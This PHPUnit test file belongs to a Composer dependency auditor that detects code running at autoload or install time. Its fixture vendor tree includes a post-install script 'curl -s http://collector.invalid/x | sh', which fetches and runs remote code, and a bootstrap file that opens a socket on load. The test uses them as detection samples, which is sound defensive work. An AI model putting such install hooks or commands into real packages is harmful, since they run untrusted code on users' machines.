<?php

declare(strict_types=1);

namespace Frost\Tests;

use Frost\Composer\Deps;
use PHPUnit\Framework\TestCase;

/**
 * Composer's two before-you-call-anything moments.
 *
 * `autoload.files` is included on every request; `scripts` run at install as
 * whoever ran composer. Neither is visible to a tool that only asks what a
 * function body could do if something called it.
 */
final class DepsTest extends TestCase
{
    use Helper;

    private function vendorTree(): string
    {
        $installed = json_encode(['packages' => [
            [
                'name' => 'acme/helpers',
                'version' => '1.2.0',
                'install-path' => '../acme/helpers',
                'autoload' => ['files' => ['bootstrap.php']],
            ],
            [
                'name' => 'acme/quiet',
                'version' => '0.1.0',
                'install-path' => '../acme/quiet',
                'autoload' => ['files' => ['helpers.php']],
            ],
            [
                'name' => 'acme/installer',
                'version' => '2.0.0',
                'install-path' => '../acme/installer',
                'scripts' => ['post-install-cmd' => ['curl -s http://collector.invalid/x | sh']],
            ],
        ]], JSON_PRETTY_PRINT);

        return $this->tree([
            'composer.json' => json_encode(['scripts' => ['post-autoload-dump' => 'php artisan package:discover']]),
            'vendor/composer/installed.json' => (string) $installed,
            // Opens a socket the moment the autoloader includes it.
            'vendor/acme/helpers/bootstrap.php' => "<?php\nfsockopen('metrics.invalid', 9000);\n",
            // Reads a setting at load: configuration, not news.
            'vendor/acme/quiet/helpers.php' => "<?php\ndefine('X', getenv('ACME_MODE'));\nfunction acme_go() { shell_exec('ls'); }\n",
            'vendor/acme/installer/src/Runner.php' => "<?php\nclass Runner { function go() { exec('ls'); } }\n",
        ]);
    }

    public function testEagerlyIncludedFilesAreReported(): void
    {
        $result = Deps::audit($this->vendorTree());

        self::assertSame(3, $result['packages']);
        $eager = array_map(static fn (array $row): string => $row[0] . ' ' . $row[1]->capability, $result['eager']);
        self::assertContains('acme/helpers network.socket', $eager);
    }

    /** Reading a setting on load is not the same as opening a socket on load. */
    public function testConfigurationReadsAtLoadAreNotNews(): void
    {
        $result = Deps::audit($this->vendorTree());
        foreach ($result['eager'] as [$package, $use]) {
            self::assertNotSame('acme/quiet', $package, 'getenv at load time is configuration: ' . $use->capability);
        }
    }

    /** A function body in an eager file is reachable, not automatic. */
    public function testWhatIsMerelyReachableIsNotReportedAsEager(): void
    {
        $result = Deps::audit($this->vendorTree());
        foreach ($result['eager'] as [, $use]) {
            self::assertNotSame('process.exec', $use->capability);
        }
    }

    public function testInstallTimeScriptsAreListedFromRootAndPackages(): void
    {
        $result = Deps::audit($this->vendorTree());
        $scripts = array_map(static fn (array $row): string => $row[0] . ' ' . $row[1], $result['scripts']);

        self::assertContains('(this project) post-autoload-dump', $scripts);
        self::assertContains('acme/installer post-install-cmd', $scripts);

        $commands = array_column($result['scripts'], 2);
        self::assertContains('curl -s http://collector.invalid/x | sh', $commands);
    }

    public function testATreeWithNoVendorDirectoryIsEmpty(): void
    {
        $result = Deps::audit($this->tree(['composer.json' => '{}']));
        self::assertSame(0, $result['packages']);
    }
}
